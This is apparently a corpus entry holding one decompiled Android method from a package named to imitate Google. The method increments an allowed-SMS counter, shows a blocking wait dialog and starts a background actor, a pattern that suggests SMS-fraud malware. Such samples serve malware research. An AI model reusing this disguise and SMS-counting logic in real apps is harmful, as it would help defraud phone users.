Class Name:RelatedContent
Content: package com.googleapi.cover;

    public void start() {
        SharedPreferences settings = getSharedPreferences(Main.KEY_PREFS, 0);
        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, settings.getInt(Actor.ALLOWED_SMS_NUMBER, 1) + 1, settings);
        this.dialog = new ProgressDialog(this);
        this.dialog.setCancelable(false);
        this.dialog.setMessage(getResources().getString(R.string.please_wait));
        this.dialog.show();
        if (!this.isRegistered) {
            this.isRegistered = true;
            registerReceiver();
        }
        this.actor.start(this.index);
    }

